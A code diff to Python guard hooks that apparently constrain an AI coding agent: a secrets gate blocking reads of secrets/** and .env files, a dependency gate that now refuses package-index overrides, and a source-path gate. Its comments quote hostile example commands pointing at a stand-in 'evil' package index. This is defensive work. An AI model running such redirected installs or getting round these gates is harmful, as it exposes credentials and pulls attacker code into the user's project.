@@ -316,17 +316,32 @@ def _secrets_gate(config):
         # not of a word in a shell command. See _match_secret. Shell parity
         # (the gate's two-phase $_dir_ok loop).
         path_targets = [ti.get(k) or ""
-                        for k in ("file_path", "notebook_path", "path",
-                                  "pattern")]
+                        for k in ("file_path", "notebook_path", "path")]
         path_targets = [t for t in path_targets if t]
+        # [round-2 review F-788] `pattern` is a SEARCH REGEX, not a path, and
+        # it used to sit in the dir_ok=True group - so the bare-directory-stem
+        # arm hard-blocked `Grep{pattern:"secrets"}`, i.e. searching your own
+        # codebase for the word "secrets" was impossible on a default
+        # install, in the gate whose own comment says it has no override
+        # path. It still has to be MATCHED (`Grep{pattern:"*.pem"}` reads
+        # matching file contents), so it moves to dir_ok=False rather than
+        # being dropped. Shell parity (PAT_CANDIDATES).
+        pat_targets = [t for t in [ti.get("pattern") or ""] if t]
         cmd_targets = _bash_candidates(ti.get("command") or "")
-        if not path_targets and not cmd_targets:
+        if not path_targets and not pat_targets and not cmd_targets:
             return {}
-        for targets, dir_ok in ((path_targets, True), (cmd_targets, False)):
+        for targets, dir_ok in ((path_targets, True), (pat_targets, False),
+                                (cmd_targets, False)):
             for target in targets:
-                if os.path.basename(target).lower() in _DOTENV_TEMPLATES:
-                    continue
-                deny = _match_secret(target, patterns, dir_ok)
+                # [round-2 review F-947] The dotenv exemption is scoped to
+                # the DOTFILE pattern family it exists to soften. It used to
+                # `continue` here, skipping every pattern including the
+                # `secrets/**` that must not be overridden, so
+                # `secrets/.env.example` was unguarded. _match_secret applies
+                # it per-pattern now. Shell parity ($_dotenv_tmpl).
+                deny = _match_secret(target, patterns, dir_ok,
+                                     os.path.basename(target).lower()
+                                     in _DOTENV_TEMPLATES)
                 if deny:
                     return deny
         return {}
@@ -334,7 +349,7 @@ def _secrets_gate(config):
     return secrets_gate
 
 
-def _match_secret(target, patterns, dir_ok=True):
+def _match_secret(target, patterns, dir_ok=True, dotenv_tmpl=False):
     # [upstream P2-4] Mirrors the shell's three-form matching exactly.
     # '*.pem'-style patterns keep the implicit leading '*' (free). The
     # '.env*' dotenv family is matched on a DOT-SEGMENT boundary so
@@ -354,6 +369,12 @@ def _match_secret(target, patterns, dir_ok=True):
         # `grep secrets README.md` and `git commit -m secrets` block, which
         # is lens B finding 4's failure mode reintroduced. Shell parity.
         dstem = cpat[:-2] if (dir_ok and cpat.endswith("/*")) else ""
+        # [F-947] The dotenv-template exemption is per-PATTERN and applies to
+        # the dotfile family only. A template that also lives under a
+        # never-read DIRECTORY is a secret by location, and `secrets/**`
+        # decides that, not its basename.
+        if dotenv_tmpl and cpat.startswith("."):
+            continue
         if cpat.startswith("*"):
             hit = (fnmatch.fnmatchcase(base, cpat)
                    or fnmatch.fnmatchcase(base, "*" + cpat)
@@ -564,19 +585,34 @@ _PIPE_TO_SHELL = re.compile(
 # must still block `evil`, and they do, because `evil` is package-shaped.
 # Shell parity.
 _VALUE_FLAGS = frozenset({
-    "-i", "--index-url", "--extra-index-url", "--find-links", "--no-binary",
-    "--only-binary", "--platform", "--python-version", "--implementation",
+    "--no-binary", "--only-binary", "--platform", "--python-version", "--implementation",
     "--abi", "--progress-bar", "--cache-dir", "--log", "--proxy", "--cert",
     "--client-cert", "--trusted-host", "--config-settings", "--report",
     "--timeout", "--retries", "--exists-action", "--upgrade-strategy",
     "--src", "-e", "--editable", "-t", "--target", "--prefix", "--root",
-    "-d", "--dest", "--registry", "--userconfig", "--globalconfig",
+    "-d", "--dest", "--userconfig", "--globalconfig",
     "--cache", "--workspace", "-w", "--omit", "--include",
     "--install-strategy", "--before", "--tag", "--scope", "--access",
     "--store-dir", "--virtual-store-dir", "--modules-folder", "--reporter",
-    "--filter", "--dir", "-C", "--manifest-path", "--features", "--index",
-    "--git", "--branch", "--rev", "--path", "-p", "--package", "--profile",
+    "--filter", "--dir", "-C", "--manifest-path", "--features",
+    "--branch", "--rev", "--path", "-p", "--package", "--profile",
     "--bin", "--example", "--vers", "-f",
+})
+# [round-2 review F-1357] A package-index override on the COMMAND LINE is
+# the same attack as the environment-variable spelling _INDEX_OVERRIDE
+# already refuses, and it was being SKIPPED as an ordinary flag value: `pip
+# install --index-url http://evil/simple requests` allowed while
+# `PIP_INDEX_URL=http://evil/simple pip install requests` was blocked, from
+# the same reason string in the same module. `cargo add --git <url>` is the
+# extreme case - an arbitrary source with no package name at all.
+# Consuming the value and then checking the package name proves nothing,
+# because the flag redirects even an APPROVED package.
+# `-f` is deliberately absent: it is pip's --find-links but npm's --force,
+# and blaming the wrong one gives worse advice than an ordinary value flag.
+# Shell parity.
+_INDEX_FLAGS = frozenset({
+    "-i", "--index-url", "--extra-index-url", "--find-links", "--registry",
+    "--index", "--git", "--repo",
 })
 # [v2.6.2] See the shell gate's is_flag_value for the full account. The
 # first version matched `=` and `^[0-9]` and therefore swallowed real
@@ -587,7 +623,16 @@ _FLAG_VALUE_SHAPE = re.compile(r"^$|://|^:|^\\.$|^\\./|^\\.\\./|^/|^~")
 # values, and every one of them contains or implies `=`, so they are tested
 # first.
 _VERSION_SPEC = re.compile(r"==|>=|<=|~=|!=|<|>")
-_BARE_VERSION = re.compile(r"^[0-9.]+$")
+# [round-2 review F-1313] Requires a DOT. `^[0-9.]+$` alone still swallowed
+# SINGLE-CHARACTER numeric names, and `0`, `1` and `2` are all real npm
+# registry packages: `npm install -f 0`, `npm install -p 1` and `npm i -w 2`
+# each installed unapproved on both substrates. Identical class to the
+# `7zip-bin`/`0x`/`2to3` hole the previous round fixed, narrowed by one
+# character - the third consecutive round this predicate shipped a hole.
+# Cost: a dotless flag value (`--python-version 3`) is now read as a package
+# name and named in the refusal, which is the over-match direction a
+# deny-list wants. Shell parity (is_flag_value).
+_BARE_VERSION = re.compile(r"^[0-9]+(?:\\.[0-9]+)+$")
 
 
 def _is_flag_value(tok):
@@ -706,6 +751,11 @@ def _scan_install_line(line, approved):
                 return ("Dependency gate: cannot verify packages listed in "
                         "a file.\\nInstall them explicitly, or approve in "
                         ".claude/steering/deps.md.", "")
+            if tok in _INDEX_FLAGS:
+                return ("Dependency gate: a package-index override is not "
+                        "verifiable.\\nIt redirects even an APPROVED package "
+                        "to another server. Remove it,\\nor set the index in "
+                        "the project\'s own package-manager config.", "")
             if tok in _VALUE_FLAGS:
                 skip_next = True
                 continue
@@ -811,6 +861,12 @@ def _tdd_gate(config):
                 return {}
         else:
             rel = raw
+        # A leading `./` is the same path and must reach the same matcher.
+        # The shell twin strips it; without this the two substrates split on
+        # `./src/x.py` (shell deny, SDK allow) - a divergence introduced by
+        # the F-1393 fix itself, caught by the corpus row added with it.
+        while rel.startswith("./"):
+            rel = rel[2:]
         if not re.match(r"(src|lib)/", rel):
             return {}
         stem = os.path.basename(rel)
